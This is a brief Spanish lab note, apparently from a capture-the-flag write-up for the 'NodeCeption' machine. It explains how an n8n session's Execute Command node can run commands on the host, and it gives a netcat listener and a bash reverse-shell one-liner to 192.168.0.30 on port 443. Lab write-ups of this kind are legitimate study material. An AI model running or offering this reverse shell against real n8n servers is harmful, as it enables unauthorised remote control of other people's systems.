- Tags : #n8n #recursos_hackerlabs 

**Recurso** : NodeCeption

**N8N** por defecto corre por el puerto *5678*

Básicamente teniendo un session para acceder a N8N podemos mediante el nodo Execute Command podemos ejecutar comandos en la maquina que aloja N8N, pues como este nodo permite esto intentaremos mediante este inyectar una reverse shell a nuestra mauquina

Nos ponemos a la eschucha
```bash
nc -nvlp 443
```

Comando de la reverse shell en n8n seria asi
```bash
bash -c "bash -i >& /dev/tcp/192.168.0.30/443 0>&1"
```

![](../../../attachments/Pasted%20image%2020260217121223.png)